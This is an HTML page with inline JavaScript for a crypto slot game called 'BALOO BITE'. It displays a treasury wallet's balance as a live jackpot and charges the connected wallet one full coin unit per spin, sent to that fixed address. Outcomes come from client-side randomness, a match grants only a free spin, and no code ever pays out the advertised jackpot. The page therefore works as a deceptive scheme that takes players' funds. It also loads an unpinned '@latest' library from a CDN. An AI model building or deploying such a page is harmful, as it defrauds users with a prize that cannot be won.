<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>BALOO BITE - EMERGENCY FIX</title>
    <style>
        body { background: #000; color: #fff; font-family: 'Impact', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .game-card { background: #0a0a0a; border: 5px solid #ffd700; border-radius: 25px; padding: 30px; text-align: center; width: 350px; box-shadow: 0 0 50px rgba(255,215,0,0.3); }
        .pot-value { font-size: 45px; color: #fff; text-shadow: 0 0 10px #ffd700; margin: 10px 0; }
        .slot-machine { display: flex; justify-content: center; gap: 10px; margin: 20px 0; }
        .reel { width: 80px; height: 100px; background: #111; border: 2px solid #333; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 45px; }
        .spinning { animation: roll 0.1s linear infinite; }
        @keyframes roll { 0% { transform: translateY(-5px); } 100% { transform: translateY(5px); } }
        .btn-bite { background: #ffd700; color: #000; border: none; padding: 20px; width: 100%; cursor: pointer; font-weight: bold; font-size: 24px; border-radius: 15px; text-transform: uppercase; }
        .btn-bite:disabled { opacity: 0.5; }
        #status { font-family: monospace; font-size: 11px; color: #ffd700; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="game-card">
        <div style="font-size:12px; color:#ffd700;">LIVE JACKPOT (XNT)</div>
        <div class="pot-value" id="potDisplay">---</div>
        <div class="slot-machine"><div class="reel" id="re1">ðŸ¦´</div><div class="reel" id="re2">ðŸ¦´</div><div class="reel" id="re3">ðŸ¦´</div></div>
        <button class="btn-bite" id="mainBtn" onclick="handleBite()">BITE THE BONE</button>
        <div id="status">READY</div>
    </div>

    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <script>
        const TREASURY = "BAavP6nxHDkVDowYXoyDaNDbc9CAgncfDPELAyjzoyTq";
        const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
        let isFree = false;

        async function updatePot() {
            try {
                const bal = await connection.getBalance(new solanaWeb3.PublicKey(TREASURY));
                document.getElementById('potDisplay').innerText = (bal / 1e9).toFixed(2);
            } catch(e) {}
        }
        updatePot();

        async function handleBite() {
            const btn = document.getElementById('mainBtn');
            const status = document.getElementById('status');
            const reels = [document.getElementById('re1'), document.getElementById('re2'), document.getElementById('re3')];
            const provider = window.x1 || window.backpack;

            if (!provider) return alert("Install Wallet!");
            btn.disabled = true;
            status.innerText = "OPENING WALLET...";
            reels.forEach(r => r.classList.add('spinning'));

            try {
                if (!isFree) {
                    await provider.connect();
                    const tx = new solanaWeb3.Transaction().add(
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey: provider.publicKey,
                            toPubkey: new solanaWeb3.PublicKey(TREASURY),
                            lamports: 1000000000
                        })
                    );
                    const { blockhash } = await connection.getLatestBlockhash();
                    tx.recentBlockhash = blockhash;
                    tx.feePayer = provider.publicKey;
                    await provider.signAndSendTransaction(tx);
                }

                const items = ['ðŸ¦´', 'ðŸ¥ˆ', 'ðŸ¥‡'];
                const res = [items[Math.floor(Math.random()*3)], items[Math.floor(Math.random()*3)], items[Math.floor(Math.random()*3)]];
                
                for (let i = 0; i < 3; i++) {
                    await new Promise(r => setTimeout(r, 600));
                    reels[i].classList.remove('spinning');
                    reels[i].innerText = res[i];
                }

                if (res[0] === res[1] || res[1] === res[2]) {
                    status.innerText = "FREE SPIN!";
                    isFree = true; btn.innerText = "FREE BARK!"; btn.disabled = false;
                } else {
                    status.innerText = "NO MATCH";
                    isFree = false;
                    startCooldown();
                }
            } catch (e) {
                status.innerText = "ERROR - TRY AGAIN";
                reels.forEach(r => r.classList.remove('spinning'));
                btn.disabled = false;
            }
        }

        function startCooldown() {
            const btn = document.getElementById('mainBtn');
            let cd = 30;
            const t = setInterval(() => {
                btn.innerText = "WAIT " + cd + "S";
                if (cd-- <= 0) { clearInterval(t); btn.disabled = false; btn.innerText = "BITE THE BONE"; }
            }, 1000);
        }
    </script>
</body>
</html>
